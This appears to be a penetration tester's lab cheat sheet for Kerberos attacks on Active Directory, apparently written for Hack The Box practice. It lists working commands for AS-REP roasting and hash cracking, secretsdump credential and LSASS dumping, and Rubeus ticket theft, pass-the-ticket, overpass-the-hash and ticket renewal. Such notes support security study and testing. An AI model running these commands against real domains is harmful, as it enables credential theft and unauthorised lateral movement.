Port 88


Have list of users, need to identify accounts that do not require Kerberos pre-authentication:
```
GetNPUsers.py -dc-ip 10.129.175.196 -request -usersfile users.txt htb.local/
```
crack hashes:
```
hashcat -m 18200 <hashes-file> /path/to/wordlist
```

have admin creds or foothold; to dump creds, including NTLM hashes, kerberos tickets, passwords:
```
secretsdump.py corp.local/admin:password@192.168.1.100
```

Obtained LSASS dump file and want to extract creds from it:
```
python secretsdump.py -lsass <LSASS-Dump-File>
```


Compromised a machine and want to extract Kerberos tickets (TGT/TGS) for lateral movement
transfer rubeus.exe to windows and run:
```
Rubeus.exe dump
```

Extracted Kerberos ticket and want to use it to access resources without password (pass-the-ticket):
```
Rubeus.exe ptt /ticket:<base64-ticket>
```

Have NTLM hash of user's pw and want to obtain kerberos ticket using the hash:
```
Rubeus.exe asktgt /user:<username> /rc4:<ntlm-hash> /domain:<domain> /dc:<domain-controller>
```
ex:
```
Rubeus.exe asktgt /user:jdoe /rc4:ab1234567890abcdef1234567890abcdef /domain:corp.local /dc:192.168.1.100
```

if rubeus dump shows a TGT with a renewable flag set, output example:
  [TGT]  ServiceName              :  krbtgt/EXAMPLE.COM
         PrincipalName            :  user@EXAMPLE.COM
         Realm                    :  EXAMPLE.COM
         StartTime                :  2/24/2024 1:22:40 AM
         EndTime                  :  2/24/2024 11:22:40 AM
         ==RenewTill==                :  3/2/2024 1:22:40 AM
         Flags                    :  ==renewable==, pre_authent
         SessionKeyType           :  aes256_cts_hmac_sha1
         Base64(ticket)           :  YIIEjAYGKwYBB...

can renew the ticket with:
```
Rubeus.exe renew /ticket:YIIEjAYGKwYBB...
```

can pass the ticket with:
```
Rubeus.exe ptt /ticket:YIIEjAYGKwYBB...
```

have system/admin access and want to extract kerberos/lsass info (similar to dump but more info):
```
Rubeus.exe harvest
```



